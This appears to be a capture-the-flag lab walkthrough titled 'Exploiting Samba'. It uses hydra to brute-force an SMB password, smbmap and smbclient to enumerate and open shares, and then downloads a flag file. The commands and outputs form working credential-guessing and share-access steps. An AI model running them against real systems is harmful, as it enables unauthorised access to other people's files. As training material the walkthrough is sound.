# Exploiting Samba

### Tools
**smbmap**\
Allows users to enumerate samba share drives across an entire domain


```bash
# Bruteforce password for jane
└─# hydra -l jane -P /usr/share/wordlists/metasploit/unix_passwords.txt 192.89.35.3 smb
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-18 10:46:16
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 1009 login tries (l:1/p:1009), ~1009 tries per task
[DATA] attacking smb://192.89.35.3:445/
[445][smb] host: 192.89.35.3   login: jane   password: abc123
1 of 1 target successfully completed, 1 valid password found
```

```bash
# See options for smbmap
└─# smbmap                                                                
usage: smbmap [-h] (-H HOST | --host-file FILE) [-u USERNAME]
              [-p PASSWORD | --prompt] [-k] [--no-pass]
              [--dc-ip IP or Host] [-s SHARE] [-d DOMAIN] [-P PORT] [-v]
              [--signing] [--admin] [--no-banner] [--no-color]
              [--no-update] [--timeout SCAN_TIMEOUT] [-x COMMAND]
              [--mode CMDMODE] [-L | -r [PATH]]
              [-g FILE | -A PATTERN | --csv FILE] [--dir-only]
              [--no-write-check] [-q] [--depth DEPTH]
~~~~~~~~~~~~~~~
```

```bash
# List shares
└─# smbmap -H 192.89.35.3 -u admin -p password1
~~~~
[+] IP: 192.89.35.3:445 Name: demo.ine.local            Status: Authenticated                                                                       
        Disk                                                    Permissions       Comment
        ----                                                    -----------       -------
        shawn                                                   READ, WRITE                                                                         
        nancy                                                   READ ONLY
        admin                                                   READ, WRITE                                                                         
        IPC$                                                    NO ACCESSIPC Service (brute.samba.recon.lab)
```

```bash
# Check smbclient options
└─# smbclient                                                             
Usage: smbclient [-?EgqBNPkV] [-?|--help] [--usage] [-M|--message=HOST]
        [-I|--ip-address=IP] [-E|--stderr] [-L|--list=HOST]
        [-T|--tar=<c|x>IXFvgbNan] [-D|--directory=DIR] [-c|--command=STRING]
        [-b|--send-buffer=BYTES] [-t|--timeout=SECONDS] [-p|--port=PORT]
        [-g|--grepable] [-q|--quiet] [-B|--browse]
        [-d|--debuglevel=DEBUGLEVEL] [--debug-stdout]
        [-s|--configfile=CONFIGFILE] [--option=name=value]

# More option details
└─# man smbclient
```

```bash
# Log in
└─# smbclient -L 192.89.35.3 -U admin
Password for [WORKGROUP\admin]:

        Sharename       Type      Comment
        ---------       ----      -------
        shawn           Disk      
        nancy           Disk      
        admin           Disk      
        IPC$            IPC       IPC Service (brute.samba.recon.lab)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        RECONLABS            

└─# smbclient //192.89.35.3/admin -U admin
Password for [WORKGROUP\admin]:
Try "help" to get a list of possible commands.
smb: \> 
```

```bash
smb: \> ls
  .                                   D        0  Fri Jul 18 10:48:15 2025
  ..                                  D        0  Wed Nov 28 00:55:12 2018
  hidden                              D        0  Wed Nov 28 00:55:12 2018

                1981311780 blocks of size 1024. 80573856 blocks available
smb: \> cd hidden
smb: \hidden\> ls
  .                                   D        0  Wed Nov 28 00:55:12 2018
  ..                                  D        0  Fri Jul 18 10:48:15 2025
  flag.tar.gz                         N      151  Wed Nov 28 00:55:12 2018

└─# tar xzf flag.tar.gz

smb: \hidden\> get flag.tar.gz
```

```bash
┌──(root㉿INE)-[~]
└─# ls                                                                    
Desktop    Downloads  flag.tar.gz  Pictures  Templates          Videos
Documents  flag       Music        Public    thinclient_drives

┌──(root㉿INE)-[~]
└─# cat flag
2727069bc058053bd561ce372721c92e
```
